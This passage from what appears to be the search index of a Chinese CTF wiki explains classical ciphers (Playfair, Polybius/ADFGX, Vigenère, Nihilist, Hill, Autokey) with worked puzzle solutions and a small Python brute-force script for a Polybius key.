<p>\u9898\u76ee\u4e2d\u6709\u5f88\u660e\u663e\u7684\u63d0\u793a123\uff0c\u90a3\u4e48\u5c31\u81ea\u7136\u9700\u8981\u8054\u60f3\u5230\u952e\u76d8\u5bc6\u7801\u4e2d\u7535\u8111\u952e\u76d8\u5750\u6807\u5bc6\u7801\uff0c\u53ef\u4ee5\u53d1\u73b0\u524d\u51e0\u4e2a\u6570\u5b57\u7b2c\u4e8c\u4e2a\u6570\u5b57\u90fd\u662f1-3\u8303\u56f4\u5185\u7684\uff0c\u4e5f\u9a8c\u8bc1\u4e86\u6211\u4eec\u7684\u731c\u6d4b\u3002\u4e8e\u662f</p> <p>23-x</p> <p>73-m</p> <p>12-a</p> <p>63-n</p> <p>11-q</p> <p>\u4e0d\u5bf9\u5440\uff0c\u5bc6\u7801\u683c\u5f0f\u662f <code>xman{</code>\uff0c\u7b2c\u56db\u4e2a\u5b57\u7b26\u662f <code>{</code>\uff0c\u4e8e\u662f\u770b\u4e86\u770b <code>{</code> \u7684\u4f4d\u7f6e\uff0c\u5176\u5e76\u6ca1\u6709\u5bf9\u5e94\u7684\u6a2a\u5750\u6807\uff0c\u4f46\u662f\u5982\u679c\u6211\u4eec\u624b\u52a8\u628a\u5b83\u89c6\u4e3a 11 \u7684\u8bdd\uff0c\u90a3\u4e48111\u5c31\u662f <code>{</code>\u3002\u7136\u540e\u4f9d\u6b21\u5f80\u540e\u63a8\uff0c\u53d1\u73b0\u786e\u5b9e\u53ef\u884c\uff0c\uff0c\u6700\u540e\u518d\u628a 121 \u89c6\u4e3a <code>}</code> \u5373\u53ef\u5f97\u5230 flag\u3002</p> <pre><code>xman{hintisenough}\n</code></pre> <p>\u4ece\u8fd9\u91cc\u6211\u4eec\u53ef\u4ee5\u770b\u51fa\uff0c\u6211\u4eec\u8fd8\u662f\u8981\u6ce8\u610f\u8fc1\u79fb\u6027\uff0c\u4e0d\u80fd\u5355\u7eaf\u5730\u7167\u642c\u4e00\u4e9b\u5df2\u6709\u7684\u77e5\u8bc6\u3002</p>"},{"location":"crypto/classical/others/#_29","title":"\u9898\u76ee","text":"<ul> <li>\u5b9e\u9a8c\u5427 \u5947\u602a\u7684\u77ed\u4fe1</li> </ul>"},{"location":"crypto/classical/polyalphabetic/","title":"\u591a\u8868\u4ee3\u6362\u52a0\u5bc6","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p> <p>\u5bf9\u4e8e\u591a\u8868\u66ff\u6362\u52a0\u5bc6\u6765\u8bf4\uff0c\u52a0\u5bc6\u540e\u7684\u5b57\u6bcd\u51e0\u4e4e\u4e0d\u518d\u4fdd\u6301\u539f\u6765\u7684\u9891\u7387\uff0c\u6240\u4ee5\u6211\u4eec\u4e00\u822c\u53ea\u80fd\u901a\u8fc7\u5bfb\u627e\u7b97\u6cd5\u5b9e\u73b0\u5bf9\u5e94\u7684\u5f31\u70b9\u8fdb\u884c\u7834\u89e3\u3002</p>"},{"location":"crypto/classical/polyalphabetic/#playfair","title":"Playfair","text":""},{"location":"crypto/classical/polyalphabetic/#_2","title":"\u539f\u7406","text":"<p>Playfair \u5bc6\u7801\uff08Playfair cipher or Playfair square\uff09\u662f\u4e00\u79cd\u66ff\u6362\u5bc6\u7801\uff0c1854 \u5e74\u7531\u82f1\u56fd\u4eba\u67e5\u5c14\u65af\u00b7\u60e0\u65af\u901a\uff08Charles Wheatstone\uff09\u53d1\u660e\uff0c\u57fa\u672c\u7b97\u6cd5\u5982\u4e0b\uff1a</p> <ol> <li>\u9009\u53d6\u4e00\u4e32\u82f1\u6587\u5b57\u6bcd\uff0c\u9664\u53bb\u91cd\u590d\u51fa\u73b0\u7684\u5b57\u6bcd\uff0c\u5c06\u5269\u4e0b\u7684\u5b57\u6bcd\u9010\u4e2a\u9010\u4e2a\u52a0\u5165 5 \u00d7 5 \u7684\u77e9\u9635\u5185\uff0c\u5269\u4e0b\u7684\u7a7a\u95f4\u7531\u672a\u52a0\u5165\u7684\u82f1\u6587\u5b57\u6bcd\u4f9d a-z \u7684\u987a\u5e8f\u52a0\u5165\u3002\u6ce8\u610f\uff0c\u5c06 q \u53bb\u9664\uff0c\u6216\u5c06 i \u548c j \u89c6\u4f5c\u540c\u4e00\u5b57\u3002</li> <li>\u5c06\u8981\u52a0\u5bc6\u7684\u660e\u6587\u5206\u6210\u4e24\u4e2a\u4e00\u7ec4\u3002\u82e5\u7ec4\u5185\u7684\u5b57\u6bcd\u76f8\u540c\uff0c\u5c06 X\uff08\u6216 Q\uff09\u52a0\u5230\u8be5\u7ec4\u7684\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u540e\uff0c\u91cd\u65b0\u5206\u7ec4\u3002\u82e5\u5269\u4e0b\u4e00\u4e2a\u5b57\uff0c\u4e5f\u52a0\u5165 X \u3002</li> <li>\u5728\u6bcf\u7ec4\u4e2d\uff0c\u627e\u51fa\u4e24\u4e2a\u5b57\u6bcd\u5728\u77e9\u9635\u4e2d\u7684\u5730\u65b9\u3002<ul> <li>\u82e5\u4e24\u4e2a\u5b57\u6bcd\u4e0d\u540c\u884c\u4e5f\u4e0d\u540c\u5217\uff0c\u5728\u77e9\u9635\u4e2d\u627e\u51fa\u53e6\u5916\u4e24\u4e2a\u5b57\u6bcd\uff08\u7b2c\u4e00\u4e2a\u5b57\u6bcd\u5bf9\u5e94\u884c\u4f18\u5148\uff09\uff0c\u4f7f\u8fd9\u56db\u4e2a\u5b57\u6bcd\u6210\u4e3a\u4e00\u4e2a\u957f\u65b9\u5f62\u7684\u56db\u4e2a\u89d2\u3002</li> <li>\u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u884c\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u53f3\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u53f3\u65b9\u5219\u53d6\u6700\u5de6\u65b9\u7684\u5b57\u6bcd\uff09\u3002</li> <li>\u82e5\u4e24\u4e2a\u5b57\u6bcd\u540c\u5217\uff0c\u53d6\u8fd9\u4e24\u4e2a\u5b57\u6bcd\u4e0b\u65b9\u7684\u5b57\u6bcd\uff08\u82e5\u5b57\u6bcd\u5728\u6700\u4e0b\u65b9\u5219\u53d6\u6700\u4e0a\u65b9\u7684\u5b57\u6bcd\uff09\u3002</li> </ul> </li> </ol> <p>\u65b0\u627e\u5230\u7684\u4e24\u4e2a\u5b57\u6bcd\u5c31\u662f\u539f\u672c\u7684\u4e24\u4e2a\u5b57\u6bcd\u52a0\u5bc6\u7684\u7ed3\u679c\u3002</p> <p>\u4ee5 playfair example \u4e3a\u5bc6\u5319\uff0c\u5f97</p> <pre><code>P L A Y F\nI R E X M\nB C D G H\nK N O Q S\nT U V W Z\n</code></pre> <p>\u8981\u52a0\u5bc6\u7684\u8baf\u606f\u4e3a Hide the gold in the tree stump</p> <pre><code>HI DE TH EG OL DI NT HE TR EX ES TU MP\n</code></pre> <p>\u5c31\u4f1a\u5f97\u5230</p> <pre><code>BM OD ZB XD NA BE KU DM UI XM MO UV IF\n</code></pre>"},{"location":"crypto/classical/polyalphabetic/#_3","title":"\u5de5\u5177","text":"<ul> <li>CAP4</li> </ul>"},{"location":"crypto/classical/polyalphabetic/#polybius","title":"Polybius","text":""},{"location":"crypto/classical/polyalphabetic/#_4","title":"\u539f\u7406","text":"<p>Polybius\u5bc6\u7801\u53c8\u79f0\u4e3a\u68cb\u76d8\u5bc6\u7801\uff0c\u5176\u4e00\u822c\u662f\u5c06\u7ed9\u5b9a\u7684\u660e\u6587\u52a0\u5bc6\u4e3a\u4e24\u4e24\u7ec4\u5408\u7684\u6570\u5b57\uff0c\u5176\u5e38\u7528\u5bc6\u7801\u8868</p> 1 2 3 4 5 1 A B C D E 2 F G H I/J K 3 L M N O P 4 Q R S T U 5 V W X Y Z <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0c\u660e\u6587 HELLO\uff0c\u52a0\u5bc6\u540e\u5c31\u662f 23 15 31 31 34\u3002</p> <p>\u53e6\u4e00\u79cd\u5bc6\u7801\u8868</p> A D F G X A b t a l p D d h o z k F q f v s n G g j c u x X m r e w y <p>\u6ce8\u610f\uff0c\u8fd9\u91cc\u5b57\u6bcd\u7684\u987a\u5e8f\u88ab\u6253\u4e71\u4e86\u3002</p> <p>A D F G X \u7684\u7531\u6765\uff1a</p> <p>1918 \u5e74\uff0c\u7b2c\u4e00\u6b21\u4e16\u754c\u5927\u6218\u5c06\u8981\u7ed3\u675f\u65f6\uff0c\u6cd5\u519b\u622a\u83b7\u4e86\u4e00\u4efd\u5fb7\u519b\u7535\u62a5\uff0c\u7535\u6587\u4e2d\u7684\u6240\u6709\u5355\u8bcd\u90fd\u7531 A\u3001D\u3001F\u3001G\u3001X \u4e94\u4e2a\u5b57\u6bcd\u62fc\u6210\uff0c\u56e0\u6b64\u88ab\u79f0\u4e3a ADFGX \u5bc6\u7801\u3002ADFGX \u5bc6\u7801\u662f 1918 \u5e74 3 \u6708\u7531\u5fb7\u519b\u4e0a\u6821 Fritz Nebel \u53d1\u660e\u7684\uff0c\u662f\u7ed3\u5408\u4e86 Polybius \u5bc6\u7801\u548c\u7f6e\u6362\u5bc6\u7801\u7684\u53cc\u91cd\u52a0\u5bc6\u65b9\u6848\u3002</p> <p>\u4e3e\u4e2a\u4f8b\u5b50\uff0cHELLO\uff0c\u4f7f\u7528\u8fd9\u4e2a\u8868\u683c\u52a0\u5bc6\uff0c\u5c31\u662f DD XF AG AG DF\u3002</p>"},{"location":"crypto/classical/polyalphabetic/#_5","title":"\u5de5\u5177","text":"<ul> <li>CrypTool</li> </ul>"},{"location":"crypto/classical/polyalphabetic/#_6","title":"\u4f8b\u5b50","text":"<p>\u8fd9\u91cc\u4ee5\u5b89\u6052\u676f 9 \u6708 Crypto \u8d5b\u9898 Go \u4e3a\u4f8b\uff0c\u9898\u76ee\u4e3a\uff1a</p> <p>\u5bc6\u6587\uff1ailnllliiikkninlekile</p> <p>\u538b\u7f29\u5305\u7ed9\u4e86\u4e00\u884c\u5341\u516d\u8fdb\u5236\uff1a546865206c656e677468206f66207468697320706c61696e746578743a203130</p> <p>\u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6</p> <p>\u9996\u5148\u5bf9\u5341\u516d\u8fdb\u5236\u8fdb\u884c hex \u89e3\u7801\uff0c\u5f97\u5230\u5b57\u7b26\u4e32\uff1a\"The length of this plaintext: 10\"</p> <p>\u5bc6\u6587\u957f\u5ea6\u4e3a 20 \uff0c\u800c\u660e\u6587\u957f\u5ea6\u4e3a 10 \uff0c\u5bc6\u6587\u53ea\u6709 \" l \",\" i \",\" n \",\" k \",\" e \" \u8fd9\u4e94\u4e2a\u5b57\u7b26\uff0c\u8054\u60f3\u5230\u68cb\u76d8\u5bc6\u7801\u3002</p> <p>\u9996\u5148\u8bd5\u4e00\u4e0b\u4e94\u4e2a\u5b57\u7b26\u6309\u5b57\u6bcd\u8868\u987a\u5e8f\u6392\u5217\uff1a</p> e i k l n e A B C D E i F G H I/J K k L M N O P l Q R S T U n V W X Y Z <p>\u6839\u636e\u5bc6\u6587\u89e3\u5bc6\u5f97\uff1aiytghpkqmq\u3002</p> <p>\u8fd9\u5e94\u8be5\u4e0d\u662f\u6211\u4eec\u60f3\u8981\u7684 flag \u7b54\u6848\u3002</p> <p>\u770b\u6765\u8fd9\u4e94\u4e2a\u5b57\u7b26\u6392\u5217\u4e0d\u662f\u8fd9\u4e48\u6392\u5217\u7684\uff0c\u4e00\u5171\u6709 5! \u79cd\u60c5\u51b5\uff0c\u5199\u811a\u672c\u7206\u7834\uff1a</p> <p><pre><code>import itertools\n\nkey = []\ncipher = \"ilnllliiikkninlekile\"\n\nfor i in itertools.permutations('ilnke', 5):\n    key.append(''.join(i))\n\nfor now_key in key:\n    solve_c = \"\"\n    res = \"\"\n    for now_c in cipher:\n        solve_c += str(now_key.index(now_c))\n    for i in range(0,len(solve_c),2):\n        now_ascii = int(solve_c[i])*5+int(solve_c[i+1])+97\n        if now_ascii&gt;ord('i'):\n            now_ascii+=1\n        res += chr(now_ascii)\n    if \"flag\" in res:\n        print now_key,res\n</code></pre> \u811a\u672c\u5176\u5b9e\u5c31\u662f\u5b9e\u73b0\u68cb\u76d8\u5bc6\u7801\u8fd9\u4e2a\u7b97\u6cd5\uff0c\u53ea\u662f\u8fd9\u4e94\u4e2a\u5b57\u7b26\u7684\u987a\u5e8f\u4e0d\u5b9a\u3002</p> <p>\u8dd1\u51fa\u4e0b\u9762\u4e24\u4e2a\u7ed3\u679c\uff1a</p> <p>linke flagishere</p> <p>linek flagkxhdwd</p> <p>\u663e\u7136\u7b2c\u4e00\u4e2a\u662f\u6211\u4eec\u60f3\u8981\u7684\u7b54\u6848\u3002</p> <p>\u9644\u4e0a\u6b63\u786e\u7684\u5bc6\u7801\u8868\uff1a</p> l i n k e l A B C D E i F G H I/J K n L M N O P k Q R S T U e V W X Y Z"},{"location":"crypto/classical/polyalphabetic/#vigenere","title":"Vigenere \u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801","text":""},{"location":"crypto/classical/polyalphabetic/#_7","title":"\u539f\u7406","text":"<p>\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\uff08Vigenere\uff09\u662f\u4f7f\u7528\u4e00\u7cfb\u5217\u51ef\u6492\u5bc6\u7801\u7ec4\u6210\u5bc6\u7801\u5b57\u6bcd\u8868\u7684\u52a0\u5bc6\u7b97\u6cd5\uff0c\u5c5e\u4e8e\u591a\u8868\u5bc6\u7801\u7684\u4e00\u79cd\u7b80\u5355\u5f62\u5f0f\u3002</p> <p></p> <p>\u4e0b\u9762\u7ed9\u51fa\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>\u660e\u6587\uff1acome greatwall\n\u5bc6\u94a5\uff1acrypto\n</code></pre> <p>\u9996\u5148\uff0c\u5bf9\u5bc6\u94a5\u8fdb\u884c\u586b\u5145\u4f7f\u5176\u957f\u5ea6\u4e0e\u660e\u6587\u957f\u5ea6\u4e00\u6837\u3002</p> \u660e\u6587 c o m e g r e a t w a l l \u5bc6\u94a5 c r y p t o c r y p t o c <p>\u5176\u6b21\uff0c\u67e5\u8868\u5f97\u5bc6\u6587</p> <p></p> <pre><code>\u660e\u6587\uff1acome greatwall\n\u5bc6\u94a5\uff1acrypto\n\u5bc6\u6587\uff1aefkt zferrltzn\n</code></pre>"},{"location":"crypto/classical/polyalphabetic/#_8","title":"\u7834\u89e3","text":"<p>\u5bf9\u5305\u62ec\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5728\u5185\u7684\u6240\u6709\u591a\u8868\u5bc6\u7801\u7684\u7834\u8bd1\u90fd\u662f\u4ee5\u5b57\u6bcd\u9891\u7387\u4e3a\u57fa\u7840\u7684\uff0c\u4f46\u76f4\u63a5\u7684\u9891\u7387\u5206\u6790\u5374\u5e76\u4e0d\u9002\u7528\uff0c\u8fd9\u662f\u56e0\u4e3a\u5728\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u4e2d\uff0c\u4e00\u4e2a\u5b57\u6bcd\u53ef\u4ee5\u88ab\u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff0c\u56e0\u800c\u7b80\u5355\u7684\u9891\u7387\u5206\u6790\u5728\u8fd9\u91cc\u5e76\u6ca1\u6709\u7528\u3002</p> <p>\u7834\u8bd1\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7684\u5173\u952e\u5728\u4e8e\u5b83\u7684\u5bc6\u94a5\u662f\u5faa\u73af\u91cd\u590d\u7684\u3002 \u5982\u679c\u6211\u4eec\u77e5\u9053\u4e86\u5bc6\u94a5\u7684\u957f\u5ea6\uff0c\u90a3\u5bc6\u6587\u5c31\u53ef\u4ee5\u88ab\u770b\u4f5c\u662f\u4ea4\u7ec7\u5728\u4e00\u8d77\u7684\u51ef\u6492\u5bc6\u7801\uff0c\u800c\u5176\u4e2d\u6bcf\u4e00\u4e2a\u90fd\u53ef\u4ee5\u5355\u72ec\u7834\u89e3\u3002\u5173\u4e8e\u5bc6\u7801\u7684\u957f\u5ea6\uff0c\u6211\u4eec\u53ef\u4ee5 \u4f7f\u7528\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u548c\u5f17\u91cc\u5fb7\u66fc\u8bd5\u9a8c\u6765\u83b7\u53d6\u3002</p> <p>\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u662f\u57fa\u4e8e\u7c7b\u4f3c the \u8fd9\u6837\u7684\u5e38\u7528\u5355\u8bcd\u6709\u53ef\u80fd\u88ab\u540c\u6837\u7684\u5bc6\u94a5\u5b57\u6bcd\u8fdb\u884c\u52a0\u5bc6\uff0c\u4ece\u800c\u5728\u5bc6\u6587\u4e2d\u91cd\u590d\u51fa\u73b0\u3002\u4f8b\u5982\uff0c\u660e\u6587\u4e2d\u4e0d\u540c\u7684 CRYPTO \u53ef\u80fd\u88ab\u5bc6\u94a5 ABCDEF \u52a0\u5bc6\u6210\u4e0d\u540c\u7684\u5bc6\u6587\uff1a</p> <pre><code>\u5bc6\u94a5\uff1aABCDEF AB CDEFA BCD EFABCDEFABCD\n\u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY\n\u5bc6\u6587\uff1aCSASXT IT UKSWT GQU GWYQVRKWAQJB\n</code></pre> <p>\u6b64\u65f6\u660e\u6587\u4e2d\u91cd\u590d\u7684\u5143\u7d20\u5728\u5bc6\u6587\u4e2d\u5e76\u4e0d\u91cd\u590d\u3002\u7136\u800c\uff0c\u5982\u679c\u5bc6\u94a5\u76f8\u540c\u7684\u8bdd\uff0c\u7ed3\u679c\u53ef\u80fd\u4fbf\u4e3a\uff08\u4f7f\u7528\u5bc6\u94a5 ABCD\uff09\uff1a</p> <pre><code>\u5bc6\u94a5\uff1aABCDAB CD ABCDA BCD ABCDABCDABCD\n\u660e\u6587\uff1aCRYPTO IS SHORT FOR CRYPTOGRAPHY\n\u5bc6\u6587\uff1aCSASTP KV SIQUT GQU CSASTPIUAQJB\n</code></pre> <p>\u6b64\u65f6\u5361\u897f\u65af\u57fa\u8bd5\u9a8c\u5c31\u80fd\u4ea7\u751f\u6548\u679c\u3002\u5bf9\u4e8e\u66f4\u957f\u7684\u6bb5\u843d\u6b64\u65b9\u6cd5\u66f4\u4e3a\u6709\u6548\uff0c\u56e0\u4e3a\u901a\u5e38\u5bc6\u6587\u4e2d\u91cd\u590d\u7684\u7247\u6bb5\u4f1a\u66f4\u591a\u3002\u5982\u901a\u8fc7\u4e0b\u9762\u7684\u5bc6\u6587\u5c31\u80fd\u7834\u8bd1\u51fa\u5bc6\u94a5\u7684\u957f\u5ea6\uff1a</p> <pre><code>\u5bc6\u6587\uff1aDYDUXRMHTVDVNQDQNWDYDUXRMHARTJGWNQD\n</code></pre> <p>\u5176\u4e2d\uff0c\u4e24\u4e2a DYDUXRMH \u7684\u51fa\u73b0\u76f8\u9694\u4e86 18 \u4e2a\u5b57\u6bcd\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u5047\u5b9a\u5bc6\u94a5\u7684\u957f\u5ea6\u662f 18 \u7684\u7ea6\u6570\uff0c\u5373\u957f\u5ea6\u4e3a 18\u30019\u30016\u30013 \u6216 2\u3002\u800c\u4e24\u4e2a NQD \u5219\u76f8\u8ddd 20 \u4e2a\u5b57\u6bcd\uff0c\u610f\u5473\u7740\u5bc6\u94a5\u957f\u5ea6\u5e94\u4e3a 20\u300110\u30015\u30014 \u6216 2\u3002\u53d6\u4e24\u8005\u7684\u4ea4\u96c6\uff0c\u5219\u53ef\u4ee5\u57fa\u672c\u786e\u5b9a\u5bc6\u94a5\u957f\u5ea6\u4e3a 2\u3002\u63a5\u4e0b\u6765\u5c31\u662f\u8fdb\u884c\u8fdb\u4e00\u6b65\u7684\u64cd\u4f5c\u4e86\u3002</p> <p>\u5173\u4e8e\u66f4\u52a0\u8be6\u7ec6\u7684\u7834\u89e3\u539f\u7406\uff0c\u8fd9\u91cc\u6682\u65f6\u4e0d\u505a\u8fc7\u591a\u7684\u4ecb\u7ecd\u3002\u53ef\u4ee5\u53c2\u8003http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-vigenere-cipher/\u3002</p>"},{"location":"crypto/classical/polyalphabetic/#_9","title":"\u5de5\u5177","text":"<ul> <li>\u5df2\u77e5\u5bc6\u94a5<ul> <li>Python \u7684 pycipher \u5e93</li> <li>\u5728\u7ebf\u89e3\u5bc6 Vigen\u00e8re cipher</li> <li>CAP4</li> </ul> </li> <li>\u672a\u77e5\u5bc6\u94a5<ul> <li>Vigen\u00e8re Cipher Codebreaker</li> <li>Vigenere Solver \uff0c\u4e0d\u591f\u5b8c\u5584\u3002</li> </ul> </li> </ul>"},{"location":"crypto/classical/polyalphabetic/#nihilist","title":"Nihilist","text":""},{"location":"crypto/classical/polyalphabetic/#_10","title":"\u539f\u7406","text":"<p>Nihilist\u5bc6\u7801\u53c8\u79f0\u5173\u952e\u5b57\u5bc6\u7801\uff1a\u660e\u6587 + \u5173\u952e\u5b57 = \u5bc6\u6587\u3002\u4ee5\u5173\u952e\u5b57 helloworld \u4e3a\u4f8b\u3002</p> <p>\u9996\u5148\u5229\u7528\u5bc6\u94a5\u6784\u9020\u68cb\u76d8\u77e9\u9635\uff08\u7c7b\u4f3c Polybius \u5bc6\u7801\uff09 - \u65b0\u5efa\u4e00\u4e2a 5 \u00d7 5 \u77e9\u9635 - \u5c06\u5b57\u7b26\u4e0d\u91cd\u590d\u5730\u4f9d\u6b21\u586b\u5165\u77e9\u9635 - \u5269\u4e0b\u90e8\u5206\u6309\u5b57\u6bcd\u987a\u5e8f\u586b\u5165 - \u5b57\u6bcd i \u548c j \u7b49\u4ef7</p> 1 2 3 4 5 1 h e l o w 2 r d a b c 3 f g i / j k m 4 n p q s t 5 u v x y z <p>\u5bf9\u4e8e\u52a0\u5bc6\u8fc7\u7a0b\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u52a0\u5bc6\uff1a</p> <p><pre><code>a -&gt; M[2,3] -&gt; 23\nt -&gt; M[4,5] -&gt; 45\n</code></pre> \u5bf9\u4e8e\u89e3\u5bc6\u8fc7\u7a0b</p> <p>\u53c2\u7167\u77e9\u9635 M \u8fdb\u884c\u89e3\u5bc6\uff1a</p> <p><pre><code>23 -&gt; M[2,3] -&gt; a\n45 -&gt; M[4,5] -&gt; t\n</code></pre> \u53ef\u4ee5\u770b\u51fa\uff0c\u5bc6\u6587\u7684\u7279\u5f81\u6709\u5982\u4e0b\u51e0\u70b9</p> <ul> <li>\u7eaf\u6570\u5b57</li> <li>\u53ea\u5305\u542b 1 \u5230 5</li> <li>\u5bc6\u6587\u957f\u5ea6\u5076\u6570\u3002</li> </ul>"},{"location":"crypto/classical/polyalphabetic/#hill","title":"Hill","text":""},{"location":"crypto/classical/polyalphabetic/#_11","title":"\u539f\u7406","text":"<p>\u5e0c\u5c14\u5bc6\u7801\uff08Hill\uff09\u4f7f\u7528\u6bcf\u4e2a\u5b57\u6bcd\u5728\u5b57\u6bcd\u8868\u4e2d\u7684\u987a\u5e8f\u4f5c\u4e3a\u5176\u5bf9\u5e94\u7684\u6570\u5b57\uff0c\u5373A=0\uff0cB=1\uff0cC=2 \u7b49\uff0c\u7136\u540e\u5c06\u660e\u6587\u8f6c\u5316\u4e3a n \u7ef4\u5411\u91cf\uff0c\u8ddf\u4e00\u4e2a n \u00d7 n \u7684\u77e9\u9635\u76f8\u4e58\uff0c\u518d\u5c06\u5f97\u51fa\u7684\u7ed3\u679c\u6a21 26\u3002\u6ce8\u610f\u7528\u4f5c\u52a0\u5bc6\u7684\u77e9\u9635\uff08\u5373\u5bc6\u5319\uff09\u5728 \\mathbb{Z}_{26}^{n} \u5fc5\u987b\u662f\u53ef\u9006\u7684\uff0c\u5426\u5219\u5c31\u4e0d\u53ef\u80fd\u89e3\u7801\u3002\u53ea\u6709\u77e9\u9635\u7684\u884c\u5217\u5f0f\u548c 26 \u4e92\u8d28\uff0c\u624d\u662f\u53ef\u9006\u7684\u3002\u4e0b\u9762\u4e3e\u4e00\u4e2a\u4f8b\u5b50</p> <pre><code>\u660e\u6587\uff1aACT\n</code></pre> <p>\u5c06\u660e\u6587\u5316\u4e3a\u77e9\u9635\u3002</p>  \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix}  <p>\u5047\u8bbe\u5bc6\u94a5\u4e3a\uff1a</p>  \\begin{bmatrix} 6 &amp; 24 &amp; 1\\\\ 13 &amp; 16 &amp; 10\\\\ 20 &amp; 17 &amp; 15 \\end{bmatrix}  <p>\u52a0\u5bc6\u8fc7\u7a0b\u4e3a\uff1a</p>  \\begin{bmatrix} 6 &amp; 24 &amp; 1\\\\ 13 &amp; 16 &amp; 10\\\\ 20 &amp; 17 &amp; 15 \\end{bmatrix} \\begin{bmatrix} 0\\\\ 2\\\\ 19 \\end{bmatrix} \\equiv \\begin{bmatrix} 67\\\\ 222\\\\ 319 \\end{bmatrix} \\equiv \\begin{bmatrix} 15\\\\ 14\\\\ 7 \\end{bmatrix} \\bmod 26  <p>\u5bc6\u6587\u5373\u4e3a</p> <pre><code>\u5bc6\u6587\uff1aPOH\n</code></pre>"},{"location":"crypto/classical/polyalphabetic/#_12","title":"\u5de5\u5177","text":"<ul> <li>http://www.practicalcryptography.com/ciphers/hill-cipher/</li> <li>CAP4</li> <li>Cryptool</li> </ul>"},{"location":"crypto/classical/polyalphabetic/#_13","title":"\u4f8b\u5b50","text":"<p>\u8fd9\u91cc\u6211\u4eec\u4ee5ISCC 2015 base decrypt 150\u4e3a\u4f8b\u8fdb\u884c\u4ecb\u7ecd\uff0c\u9898\u76ee\u4e3a</p> <p>\u5bc6\u6587\uff1a 22,09,00,12,03,01,10,03,04,08,01,17 \uff08wjamdbkdeibr\uff09</p> <p>\u4f7f\u7528\u7684\u77e9\u9635\u662f 1 2 3 4 5 6 7 8 10</p> <p>\u8bf7\u5bf9\u5bc6\u6587\u89e3\u5bc6.</p> <p>\u9996\u5148\uff0c\u77e9\u9635\u662f 3 \u00d7 3 \u7684\u3002\u8bf4\u660e\u6bcf\u6b21\u52a0\u5bc63\u4e2a\u5b57\u7b26\u3002\u6211\u4eec\u76f4\u63a5\u4f7f\u7528 Cryptool\uff0c\u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u8fd9\u4e2a\u77e9\u9635\u662f\u6309\u7167\u5217\u6765\u6392\u5e03\u7684\u3002\u5373\u5982\u4e0b</p> <pre><code>1 4 7\n2 5 8\n3 6 10\n</code></pre> <p>\u6700\u540e\u7684\u7ed3\u679c\u4e3a <code>overthehillx</code>\u3002</p>"},{"location":"crypto/classical/polyalphabetic/#autokeycipher","title":"AutokeyCipher","text":""},{"location":"crypto/classical/polyalphabetic/#_14","title":"\u539f\u7406","text":"<p>\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\uff08Autokey Cipher\uff09\u4e5f\u662f\u591a\u8868\u66ff\u6362\u5bc6\u7801\uff0c\u4e0e\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4f46\u4f7f\u7528\u4e0d\u540c\u7684\u65b9\u6cd5\u751f\u6210\u5bc6\u94a5\u3002\u901a\u5e38\u6765\u8bf4\u5b83\u8981\u6bd4\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u66f4\u5b89\u5168\u3002\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u4e3b\u8981\u6709\u4e24\u79cd\uff0c\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u548c\u539f\u6587\u81ea\u52a8\u5bc6\u94a5\u5bc6\u7801\u3002\u4e0b\u9762\u6211\u4eec\u4ee5\u5173\u952e\u8bcd\u81ea\u52a8\u5bc6\u94a5\u4e3a\u4f8b\uff1a</p> <pre><code>\u660e\u6587\uff1aTHE QUICK BROWN FOX JUMPS OVER THE LAZY DOG\n\u5173\u952e\u8bcd\uff1aCULTURE\n</code></pre> <p>\u81ea\u52a8\u751f\u6210\u5bc6\u94a5\uff1a</p> <pre><code>CULTURE THE QUICK BROWN FOX JUMPS OVER THE\n</code></pre> <p>\u63a5\u4e0b\u6765\u7684\u52a0\u5bc6\u8fc7\u7a0b\u548c\u7ef4\u5409\u5c3c\u4e9a\u5bc6\u7801\u7c7b\u4f3c\uff0c\u4ece\u76f8\u5e94\u7684\u8868\u683c\u53ef\u5f97\uff1a</p> <p>\u5bc6\u6587</p> <pre><code>VBP JOZGD IVEQV HYY AIICX CSNL FWW ZVDP WVK\n</code></pre>"},{"location":"crypto/classical/polyalphabetic/#_15","title":"\u5de5\u5177","text":"<ul> <li>\u5df2\u77e5\u5173\u952e\u8bcd<ul> <li>Python \u7684 pycipher \u5e93</li> </ul> </li> <li>\u672a\u77e5\u5173\u952e\u8bcd<ul> <li>http://www.practicalcryptography.com/cryptanalysis/stochastic-searching/cryptanalysis-autokey-cipher/</li> <li>tools \u6587\u4ef6\u5939\u4e0b break_autokey.py\uff0c\u5f85\u5b8c\u6210\u3002</li> </ul> </li> </ul>"},{"location":"crypto/classical/summary/","title":"\u603b\u7ed3","text":"<p>Warning</p> <p>The current page still doesn't have a translation for this language.</p> <p>You can read it through google translate.</p> <p>Besides, you can also help to translate it: Contributing.</p>"},{"location":"crypto/classical/summary/#_2","title":"\u53e4\u5178\u5bc6\u7801\u5206\u6790\u601d\u8def","text":"<p>CTF 